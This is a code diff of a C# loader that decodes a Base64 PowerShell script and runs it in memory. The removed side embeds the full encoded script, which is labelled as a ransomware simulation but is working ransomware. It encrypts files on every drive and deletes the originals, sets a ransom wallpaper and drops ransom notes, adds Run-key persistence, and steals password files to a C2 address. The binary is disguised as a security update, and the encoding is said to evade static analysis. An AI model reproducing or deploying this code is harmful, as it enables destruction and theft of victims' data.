@@ -1,49 +1,44 @@
-using System.Reflection;
 using System;
-using System.Management.Automation; // Requires System.Management.Automation.dll
-using System.Management.Automation.Runspaces;
-using System.Collections.ObjectModel;
 using System.Text;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
 
-[assembly: AssemblyTitle("Apex Pro System Host")]
-[assembly: AssemblyDescription("Critical System Health and Security Update")]
-[assembly: AssemblyConfiguration("")]
-[assembly: AssemblyCompany("Apex Security Solutions")]
-[assembly: AssemblyProduct("Apex Framework")]
-[assembly: AssemblyCopyright("Copyright © 2026")]
-[assembly: AssemblyVersion("1.0.4.2")]
-[assembly: AssemblyFileVersion("1.0.4.2")]
+namespace ApexRunner {
+    class Program {
+        static void Main(string[] args) {
+            try {
+                // The @ symbol handles the 28KB string without 'newline' errors
+                string encodedScript = "REPLACE_ME"; 
 
-namespace ApexPro
-{
-    class Program
-    {
-        static void Main(string[] args)
-        {
-            // 1. YOUR POWERSHELL CODE (B64 Encoded to prevent static analysis)
-            // You would take your ApexSim.ps1 and convert it to a Base64 string
-            string encodedScript = "PCMKLlNZTk9QU0lTCiAgICBBcGV4IFBybyBBZHZlcnNhcnkgRW11bGF0aW9uIEFnZW50LgouREVTQ1JJUFRJT04KICAgIENvbXByZWhlbnNpdmUgc2NyaXB0IHRvIHNpbXVsYXRlIHJhbnNvbXdhcmUgYmVoYXZpb3IuCiM+CgpwYXJhbSgKICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlKV0KICAgIFtWYWxpZGF0ZVNldCgiRW5jcnlwdCIsICJEZWNyeXB0IildCiAgICAkTW9kZSwgCgogICAgW3N0cmluZ10kVGFyZ2V0UGF0aCA9ICJDOlxTaW11bGF0aW9uRGF0YSIsIAoKICAgIFtzdHJpbmddJEMyVXJsID0gImh0dHBzOi8vWU9VUl9DMl9JUC9hcGkvdjEvdGVsZW1ldHJ5IiwKCiAgICBbaW50XSRUaW1lciA9IDYwCikKCiMgR2xvYmFsIFNTTCBCeXBhc3MgZm9yIEFkLUhvYy9TZWxmLVNpZ25lZCBDZXJ0aWZpY2F0ZXMKW1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrID0geyR0cnVlfQoKIyBTaGFyZWQgQUVTLTI1NiBLZXkgKDMyIGJ5dGVzKQokUGFzc3BocmFzZSA9ICIxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMiIKJEtleUJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkUGFzc3BocmFzZSkKCiMgLS0tIFNFQ1RJT04gMTogV0FMTFBBUEVSIEhJSkFDSyAtLS0KJFdQX0NvZGUgPSBAJwp1c2luZyBTeXN0ZW07CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKcHVibGljIGNsYXNzIFdhbGxwYXBlciB7CiAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgU3lzdGVtUGFyYW1ldGVyc0luZm8oaW50IHVBY3Rpb24sIGludCB1UGFyYW0sIHN0cmluZyBscHZQYXJhbSwgaW50IGZ1V2luSW5pKTsKICAgIHB1YmxpYyBjb25zdCBpbnQgU1BJX1NFVERFU0tXQUxMUEFQRVIgPSAweDAwMTQ7CiAgICBwdWJsaWMgY29uc3QgaW50IFNQSUZfVVBEQVRFSU5JRklMRSA9IDB4MDE7CiAgICBwdWJsaWMgY29uc3QgaW50IFNQSUZfU0VORFdJTklOSUNIQU5HRSA9IDB4MDI7CiAgICBwdWJsaWMgc3RhdGljIHZvaWQgU2V0KHN0cmluZyBwYXRoKSB7CiAgICAgICAgU3lzdGVtUGFyYW1ldGVyc0luZm8oU1BJX1NFVERFU0tXQUxMUEFQRVIsIDAsIHBhdGgsIFNQSUZfVVBEQVRFSU5JRklMRSB8IFNQSUZfU0VORFdJTklOSUNIQU5HRSk7CiAgICB9Cn0KJ0AKQWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uICRXUF9Db2RlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCgpmdW5jdGlvbiBTZXQtQXBleFdhbGxwYXBlciB7CiAgICBBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5EcmF3aW5nCiAgICAkUGF0aCA9ICIkZW52OlRFTVBcYXBleF9iZy5ibXAiCiAgICAkQm1wID0gTmV3LU9iamVjdCBTeXN0ZW0uRHJhd2luZy5CaXRtYXAoMTkyMCwxMDgwKQogICAgJEcgPSBbU3lzdGVtLkRyYXdpbmcuR3JhcGhpY3NdOjpGcm9tSW1hZ2UoJEJtcCkKICAgICRHLkNsZWFyKFtTeXN0ZW0uRHJhd2luZy5Db2xvcl06OkRhcmtSZWQpCiAgICAkRm9udCA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuRm9udCgiSW1wYWN0IiwgODApCiAgICAkRy5EcmF3U3RyaW5nKCJTWVNURU0gRU5DUllQVEVEIiwgJEZvbnQsIFtTeXN0ZW0uRHJhd2luZy5CcnVzaGVzXTo6V2hpdGUsIDQwMCwgNDAwKQogICAgJEcuRHJhd1N0cmluZygiQ29udGFjdCBBZG1pbiB0byBSZWNvdmVyIiwgKE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuRm9udCgiQXJpYWwiLCA0MCkpLCBbU3lzdGVtLkRyYXdpbmcuQnJ1c2hlc106OldoaXRlLCA1NTAsIDU1MCkKICAgICRCbXAuU2F2ZSgkUGF0aCwgW1N5c3RlbS5EcmF3aW5nLkltYWdpbmcuSW1hZ2VGb3JtYXRdOjpCbXApCiAgICAkRy5EaXNwb3NlKCk7ICRCbXAuRGlzcG9zZSgpCiAgICBbV2FsbHBhcGVyXTo6U2V0KCRQYXRoKQp9CgojIC0tLSBTRUNUSU9OIDI6IENSWVBUTyBFTkdJTkUgLS0tCmZ1bmN0aW9uIEludm9rZS1BcGV4Q2lwaGVyIHsKICAgIHBhcmFtICgkUGF0aCwgJEtleSwgJEFjdGlvbikKICAgIHRyeSB7CiAgICAgICAgJEFlcyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc106OkNyZWF0ZSgpCiAgICAgICAgJEFlcy5LZXkgPSAkS2V5CiAgICAgICAgaWYgKCRBY3Rpb24gLWVxICJFbmNyeXB0IikgewogICAgICAgICAgICAkQWVzLkdlbmVyYXRlSVYoKQogICAgICAgICAgICAkRW5jID0gJEFlcy5DcmVhdGVFbmNyeXB0b3IoKQogICAgICAgICAgICAkSW4gPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJFBhdGgpCiAgICAgICAgICAgICRPdXQgPSAkRW5jLlRyYW5zZm9ybUZpbmFsQmxvY2soJEluLCAwLCAkSW4uTGVuZ3RoKQogICAgICAgICAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCIkUGF0aC5sb2NrZWQiLCAoJEFlcy5JViArICRPdXQpKQogICAgICAgICAgICBSZW1vdmUtSXRlbSAkUGF0aCAtRm9yY2UKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkSW4gPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJFBhdGgpCiAgICAgICAgICAgICRBZXMuSVYgPSAkSW5bMC4uMTVdCiAgICAgICAgICAgICRDaXBoZXIgPSAkSW5bMTYuLigkSW4uTGVuZ3RoLTEpXQogICAgICAgICAgICAkRGVjID0gJEFlcy5DcmVhdGVEZWNyeXB0b3IoKQogICAgICAgICAgICAkUGxhaW4gPSAkRGVjLlRyYW5zZm9ybUZpbmFsQmxvY2soJENpcGhlciwgMCwgJENpcGhlci5MZW5ndGgpCiAgICAgICAgICAgIFtTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsQnl0ZXMoJFBhdGguUmVwbGFjZSgiLmxvY2tlZCIsIiIpLCAkUGxhaW4pCiAgICAgICAgICAgIFJlbW92ZS1JdGVtICRQYXRoIC1Gb3JjZQogICAgICAgIH0KICAgIH0gY2F0Y2ggeyBXcml0ZS1XYXJuaW5nICJBY2Nlc3MgRGVuaWVkOiAkUGF0aCIgfQp9CgojIC0tLSBTRUNUSU9OIDM6IEMyIEVYRklMVFJBVElPTiAoQklOQVJZIFNZTkNFRCkgLS0tCmZ1bmN0aW9uIFNlbmQtQXBleEV4ZmlsIHsKICAgIHBhcmFtICgkRGF0YU1hbmlmZXN0KQogICAgJEZpbmFsUGF5bG9hZCA9IGlmICgkRGF0YU1hbmlmZXN0IC1pcyBbc3RyaW5nXSkgeyAkRGF0YU1hbmlmZXN0IH0gZWxzZSB7ICREYXRhTWFuaWZlc3QgfCBDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MgfQoKICAgICRBZXMgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5BZXNdOjpDcmVhdGUoKQogICAgJEFlcy5LZXkgPSAkS2V5Qnl0ZXM7ICRBZXMuR2VuZXJhdGVJVigpCiAgICAkRW5jID0gJEFlcy5DcmVhdGVFbmNyeXB0b3IoKQogICAgJFBheWxvYWRCeXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJEZpbmFsUGF5bG9hZCkKICAgICRDaXBoZXIgPSAkRW5jLlRyYW5zZm9ybUZpbmFsQmxvY2soJFBheWxvYWRCeXRlcywgMCwgJFBheWxvYWRCeXRlcy5MZW5ndGgpCiAgICAKICAgICRCaW5hcnlCbG9iID0gTmV3LU9iamVjdCBieXRlW10gKDE2ICsgJENpcGhlci5MZW5ndGgpCiAgICBbQXJyYXldOjpDb3B5KCRBZXMuSVYsIDAsICRCaW5hcnlCbG9iLCAwLCAxNikKICAgIFtBcnJheV06OkNvcHkoJENpcGhlciwgMCwgJEJpbmFyeUJsb2IsIDE2LCAkQ2lwaGVyLkxlbmd0aCkKICAgIAogICAgdHJ5IHsKICAgICAgICAkV0MgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50CiAgICAgICAgJFdDLkhlYWRlcnMuQWRkKCJDb250ZW50LVR5cGUiLCAiYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtIikKICAgICAgICAkV0MuVXBsb2FkRGF0YSgkQzJVcmwsICJQT1NUIiwgJEJpbmFyeUJsb2IpIHwgT3V0LU51bGwKICAgICAgICBXcml0ZS1Ib3N0ICJbK10gU1VDQ0VTUzogRGF0YSBFeGZpbHRyYXRlZCAoJCgkQmluYXJ5QmxvYi5MZW5ndGgpIGJ5dGVzKSIgLUZvcmVncm91bmRDb2xvciBHcmVlbgogICAgfSBjYXRjaCB7CiAgICAgICAgV3JpdGUtSG9zdCAiWyEhIV0gRVhGSUwgRVJST1I6ICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIiAtRm9yZWdyb3VuZENvbG9yIFJlZAogICAgfQp9CgpmdW5jdGlvbiBJbnZva2UtQXBleFRoZWZ0IHsKICAgIHBhcmFtICgkRmlsZVBhdGgpCiAgICAkRmlsZVN0cmVhbSA9ICRudWxsCiAgICB0cnkgewogICAgICAgICRGaWxlTmFtZSA9IFNwbGl0LVBhdGggJEZpbGVQYXRoIC1MZWFmCiAgICAgICAgJEZpbGVTdHJlYW0gPSBbU3lzdGVtLklPLkZpbGVdOjpPcGVuKCRGaWxlUGF0aCwgW1N5c3RlbS5JTy5GaWxlTW9kZV06Ok9wZW4sIFtTeXN0ZW0uSU8uRmlsZUFjY2Vzc106OlJlYWQsIFtTeXN0ZW0uSU8uRmlsZVNoYXJlXTo6UmVhZFdyaXRlKQogICAgICAgICRCdWZmZXIgPSBOZXctT2JqZWN0IGJ5dGVbXSAkRmlsZVN0cmVhbS5MZW5ndGgKICAgICAgICAkRmlsZVN0cmVhbS5SZWFkKCRCdWZmZXIsIDAsICRGaWxlU3RyZWFtLkxlbmd0aCkgfCBPdXQtTnVsbAogICAgICAgICRGaWxlU3RyZWFtLkNsb3NlKCkKCiAgICAgICAgJEI2NENvbnRlbnQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRCdWZmZXIpCiAgICAgICAgJFRoZWZ0UGF5bG9hZCA9ICJMT09UfCRGaWxlTmFtZXwkQjY0Q29udGVudCIKICAgICAgICBTZW5kLUFwZXhFeGZpbCAtRGF0YU1hbmlmZXN0ICRUaGVmdFBheWxvYWQKICAgIH0gY2F0Y2ggeyAKICAgICAgICBpZiAoJEZpbGVTdHJlYW0pIHsgJEZpbGVTdHJlYW0uQ2xvc2UoKSB9CiAgICAgICAgV3JpdGUtSG9zdCAiWyFdIFRoZWZ0IEZhaWxlZCBmb3IgJEZpbGVQYXRoIiAtRm9yZWdyb3VuZENvbG9yIEdyYXkgCiAgICB9Cn0KCiMgLS0tIFNFQ1RJT04gNDogTUFJTiBFWEVDVVRJT04gLS0tCmlmICgkTW9kZSAtZXEgIkVuY3J5cHQiKSB7CiAgICBXcml0ZS1Ib3N0ICJbIV0gSU5JVElBVElORyBJTVBBQ1QgUEhBU0UuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkCiAgICBTZXQtQXBleFdhbGxwYXBlcgoKICAgICRDdXJyZW50UGF0aCA9ICRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGgKICAgICRSdW5WYWx1ZSA9IGlmICgkQ3VycmVudFBhdGggLWxpa2UgIiouZXhlIikgeyAiYCIkQ3VycmVudFBhdGhgIiIgfSBlbHNlIHsgInBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUZpbGUgYCIkUFNDb21tYW5kUGF0aGAiIC1Nb2RlIEVuY3J5cHQiIH0KICAgIE5ldy1JdGVtUHJvcGVydHkgLVBhdGggIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIgLU5hbWUgIkFwZXhVcGRhdGUiIC1WYWx1ZSAkUnVuVmFsdWUgLUZvcmNlIHwgT3V0LU51bGwKCiAgICAkVGFyZ2V0cyA9IEAoJFRhcmdldFBhdGgpCiAgICAkVGFyZ2V0cyArPSBHZXQtUFNEcml2ZSAtUFNQcm92aWRlciBGaWxlU3lzdGVtIHwgV2hlcmUtT2JqZWN0IHsgJF8uRGlzcGxheVJvb3QgfSB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IFJvb3QKCiAgICBmb3JlYWNoICgkVCBpbiAkVGFyZ2V0cykgewogICAgICAgIGlmIChUZXN0LVBhdGggJFQpIHsKICAgICAgICAgICAgJEZpbGVzID0gR2V0LUNoaWxkSXRlbSAkVCAtUmVjdXJzZSAtRmlsZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7JF8uRXh0ZW5zaW9uIC1uZSAiLmxvY2tlZCIgLWFuZCAkXy5OYW1lIC1ub3RsaWtlICIqUkVDT1ZFUioifQogICAgICAgICAgICBpZiAoJEZpbGVzKSB7IAogICAgICAgICAgICAgICAgU2VuZC1BcGV4RXhmaWwgLURhdGFNYW5pZmVzdCAoJEZpbGVzIHwgU2VsZWN0LU9iamVjdCBOYW1lLCBMZW5ndGgpIAogICAgICAgICAgICAgICAgZm9yZWFjaCAoJEYgaW4gJEZpbGVzKSB7IAogICAgICAgICAgICAgICAgICAgIGlmICgkRi5OYW1lIC1saWtlICIqQURNSU5fUEFTU1dPUkRTKiIgLW9yICRGLk5hbWUgLWxpa2UgIipjYW5hcnkqIikgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1Ib3N0ICJbIV0gVEFSR0VUIElERU5USUZJRUQ6ICQoJEYuTmFtZSkuIFN0ZWFsaW5nLi4uIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvdwogICAgICAgICAgICAgICAgICAgICAgICBJbnZva2UtQXBleFRoZWZ0IC1GaWxlUGF0aCAkRi5GdWxsTmFtZQogICAgICAgICAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDUwMAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBJbnZva2UtQXBleENpcGhlciAtUGF0aCAkRi5GdWxsTmFtZSAtS2V5ICRLZXlCeXRlcyAtQWN0aW9uICJFbmNyeXB0IiAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkRGlycyA9IEdldC1DaGlsZEl0ZW0gJFQgLVJlY3Vyc2UgLURpcmVjdG9yeSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZTsgJERpcnMgKz0gR2V0LUl0ZW0gJFQKICAgICAgICAgICAgZm9yZWFjaCAoJEQgaW4gJERpcnMpIHsgCiAgICAgICAgICAgICAgICAiPGh0bWw+PGJvZHkgc3R5bGU9J2JhY2tncm91bmQtY29sb3I6YmxhY2s7Y29sb3I6cmVkO3RleHQtYWxpZ246Y2VudGVyOyc+PGgxPiEhISBDT05UQUNUIEFETUlOIFRPIFJFQ09WRVIgREFUQSAhISE8L2gxPjwvYm9keT48L2h0bWw+IiB8IE91dC1GaWxlIChKb2luLVBhdGggJEQuRnVsbE5hbWUgIlJFQ09WRVJfRklMRVNfTk9XLmh0bWwiKSAtRm9yY2UgCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgJEVuZCA9IChHZXQtRGF0ZSkuQWRkU2Vjb25kcygkVGltZXIpCiAgICB3aGlsZSAoKEdldC1EYXRlKSAtbHQgJEVuZCkgewogICAgICAgIFdyaXRlLUhvc3QgImByWyFdIERBVEEgV0lQRSBJTjogJCgoJEVuZCAtIChHZXQtRGF0ZSkpLlRvU3RyaW5nKCdtbVw6c3MnKSkiIC1Ob05ld2xpbmUgLUZvcmVncm91bmRDb2xvciBSZWQKICAgICAgICBTdGFydC1TbGVlcCAxCiAgICB9Cn0gCmVsc2UgewogICAgV3JpdGUtSG9zdCAiWypdIElOSVRJQVRJTkcgUkVDT1ZFUlkgUEhBU0UuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4KICAgIEdldC1DaGlsZEl0ZW0gJFRhcmdldFBhdGggLVJlY3Vyc2UgLUZpbHRlciAiKi5sb2NrZWQiIHwgRm9yRWFjaC1PYmplY3QgeyBJbnZva2UtQXBleENpcGhlciAtUGF0aCAkXy5GdWxsTmFtZSAtS2V5ICRLZXlCeXRlcyAtQWN0aW9uICJEZWNyeXB0IiB9CiAgICBSZW1vdmUtSXRlbVByb3BlcnR5IC1QYXRoICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iIC1OYW1lICJBcGV4VXBkYXRlIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQp9";
-            byte[] data = Convert.FromBase64String(encodedScript);
-            string decodedScript = Encoding.UTF8.GetString(data);
+                byte[] data = Convert.FromBase64String(encodedScript);
+                string script = Encoding.UTF8.GetString(data);
 
-            // 2. CREATE A RUNSPACE
-            Runspace rs = RunspaceFactory.CreateRunspace();
-            rs.Open();
+                using (Runspace rs = RunspaceFactory.CreateRunspace()) {
+                    rs.Open();
+                    using (PowerShell ps = PowerShell.Create()) {
+                        ps.Runspace = rs;
+                        
+                        // CORRECTION: Add script directly (No curly braces)
+                        ps.AddScript(script);
 
-            PowerShell ps = PowerShell.Create();
-            ps.Runspace = rs;
-            
-            // 3. EXECUTE THE SCRIPT IN MEMORY
-            ps.AddScript(decodedScript);
-            
-            // Pass arguments if needed (Mode, TargetPath, etc)
-            ps.AddParameter("Mode", "Encrypt");
-            ps.AddParameter("C2Url", "https://192.168.56.1/api/v1/telemetry");
+                        // PATCH: Satisfy the Mandatory 'Mode' parameter from ApexSim.ps1
+                        if (args.Length == 0) {
+                            ps.AddParameter("Mode", "Encrypt");
+                            ps.AddParameter("TargetPath", @"C:\SimulationData");
+                        } else {
+                            // Allows command line override: ApexUpdate.exe Decrypt
+                            ps.AddParameter("Mode", args[0]);
+                        }
 
-            ps.Invoke();
-            
-            Console.WriteLine("[+] Update Complete.");
-            rs.Close();
+                        // EXECUTE
+                        ps.Invoke();
+                    }
+                    rs.Close();
+                }
+            } catch (Exception ex) {
+                // Error feedback if run via Command Prompt
+                Console.WriteLine("PowerShell Engine Error: " + ex.Message);
+            }
         }
     }
 }
